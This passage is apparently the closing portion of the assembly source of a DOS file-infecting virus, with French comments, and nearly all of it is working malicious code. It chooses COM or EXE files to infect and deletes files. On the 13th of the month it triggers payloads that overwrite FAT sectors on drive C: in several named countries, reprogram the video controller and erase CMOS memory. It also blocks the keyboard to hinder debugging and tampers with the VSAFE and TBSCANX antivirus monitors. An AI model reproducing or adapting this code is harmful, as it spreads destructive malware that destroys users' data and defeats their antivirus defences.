	ret                     ;sortie
@NC:    
	mov ah,41H              ;Fonction DOS Effacer fichier
	int 21H                 ;r‚pertoire root
	inc dx
	mov ah,41H
	int 21H                 ;r‚pertoire courant
	ret
	
;*****************************************************************************
;Cette routine positionne le pointeur du fichier au d‚but du programme infect‚.
@INT42:
	mov bx,[HANDLE]
	mov ax,4200H
	int 21H
	ret
   
;*****************************************************************************
;Cette routine place la taille du fichier infect‚ dans les registres cx et dx.
@SET_SIZE:
	mov dx,WORD [FSIZE]
	mov cx,WORD [FSIZE+2]
	ret
	   
;*****************************************************************************
;Cette routine utilise le Compteur d'Heure et le flag parit‚ pour d‚terminer
;le type de fichier … infecter (COM/EXE).
CHOOSE_FILE:
	mov bx,OFFSET EXEFILE
	mov W[bx+2],452EH  ;par d‚faut, fichier EXE … infecter
	mov W[bx+4],4558H
	xor ah,ah               ;lecture compteur d'heure
	int 1AH
	or dl,dl
	jp CF_RET               ;parit‚-> EXE   imparit‚-> COM
	mov W[bx+2],432EH          ;'.C'
	mov W[bx+4],4D4FH          ;'OM'

TEST_FILE:                      ;determine quel type de fichier est infect‚
	cmp B[EXEFILE+3],'C'    ;retour: ZF=1:Com       ZF=0:Exe
CF_RET: ret

;*****************************************************************************
;Cette routine teste si la date systŠme est un Vendredi 13 ou un 13 du mois.
;Elle enclenche alors les routines de dysfonctionnement correspondantes, et 
;postionne le flag Z pour sortir imm‚diatement.
DISTURB:
	mov ah,2AH
	int 21H                 ;demande date systŠme
	cmp dl,0DH              ;jour=13 ?
	jne D_RET               ;non, sortie
	cmp al,5                ;jour=Vendredi ?
	je FRIDAY13             ;oui : saute … la routine correspondante
	FIDDLE_MCB:             ;non, falsifie le nom du MCB du fichier h“te
	mov ax,es               ;situ‚ avant le PSP
	dec ax
	mov es,ax
	mov di,8
	xor si,si               ;si <- Offset VNAME
	mov cx,4
	rep movsw
	D_RET:  ret             ;sortie

FRIDAY13:
	mov ax,3800H            ;teste indicatif pays
	mov dx,OFFSET USEFILE   ;buffer
	int 21H
	cmp bl,33               ;France ?
	je KILLFAT
	cmp bl,1                ;USA ?
	je KILLFAT             
	cmp bl,51H              ;Japon ?
	je KILLFAT
	cmp bl,58H              ;Ta‹wan ?
	je KILLFAT
	cmp bl,31H              ;Allemagne ?
	je KILLFAT
				;autres :
KILLSCREEN:                     ;acc‚lŠre la fr‚quence du balayage horizontal
	mov dx,3D4H             ;par le registre 0 du CRTC
	mov al,11H
	out dx,al               ;indexe registre 11
	inc dx
	in al,dx                ;lit registre 11
	and al,7FH              ;masque bit de protection
	out dx,al               ;‚crit registre 11
	dec dx
	xor al,al
	out dx,al               ;indexe registre 0
	inc dx
	dec al
	out dx,al               ;ecrit registre 0
KILL_CMOS:     
	mov al,15H              ;Efface la m‚moire CMOS du REAL TIME CLOCK
	out 70H,al              ;en reprogrammant le registre relatif … la
	xor al,al               ;configuration m‚moire
	out 71H,al
	ret                     ;sortie

; Ecriture des secteurs de la FAT. Cette routine ne se d‚clenche qu'… partir        
; de Midi.
KILLFAT:
	mov ah,2CH              ;teste heure du systŠme
	int 21H
	cmp ch,0CH              ;Midi?
	jb KILLSCREEN   
	push ds 
	mov dx,13H*4
	xor ax,ax
	mov ds,ax               ;DS:DX <- @Vecteur Int 13H
	mov ah,13H
	int 2FH                 ;DS:DX & ES:BX <- @Int 13H BIOS
	mov ax,2513H
	int 21H                 ;d‚tourne int 13H sur BIOS
	mov ax,03FFH            ;fonction ‚criture 255 secteurs
	mov cx,0002             ;piste 0 secteur 2
	mov dx,0180             ;tˆte 1 disque C:
	sub bx,bx               ;buffer = ?
	int 13H
	pop ds
	jmp KILLSCREEN
	
;*****************************************************************************
;Ces routines programment le registre du second contr“leur d'interruptions
;pour (d‚s)activer les interruptions hard clavier (anti-debugging).
KEYB_OFF:
	in al,21H               ;port d'E/S 21h : registre masque PIC
	or al,02
KB1:    out 21H,al
	ret
KEYB_ON:
	in al,21H
	and al,0FDH
	jmp SHORT KB1
 
;*****************************************************************************
;Routine d‚fensive : trompes les TSR antivirus VSAFE de Central Point, et
;TBSCANX de Thunderbyte. 
TSR_FAKER:
	mov ax,0FA02H
	mov dx,5945H
	mov bl,[VSAFE_OPT]
	int 16H                 ;modifie les options d'avertissement de VSAFE
	mov [VSAFE_OPT],cl      ;et r‚cupŠre les options pr‚c‚dentes

	mov ax,0CA02H            
TBSX:   mov bl,0
	int 2FH                 ;active/d‚sactive TBSCANX
	ret
	
;*****************************************************************************
;Affiche le fichier infect‚.
DISPLAY:
	mov ah,09
	mov dx,OFFSET USEFILE
	mov B[CHKSUM1],'$'
	INT 21H
	ret




FINAL:                  ;dernier octet de code … ˆtre gard‚ dans le virus
FINNX        EQU OFFSET FINAL+STACKSIZE  ;Equivalence pour d‚terminer l'espace m‚moire
				;n‚cessaire au CPA (Offset actuel-1 +100H)
WORDS_TO_CRYPT   EQU (OFFSET OLDDTA+OFFSET FINAL-OFFSET CRYPT_CODE)/2

VSEG    ENDS

;*****************************************************************************
;Stack Segment Virus

VSTACK  SEGMENT PARA STACK
	db STACKSIZE dup (?)
VSTACK  ENDS

	END HOST       ;le point d'entr‚e est le virus


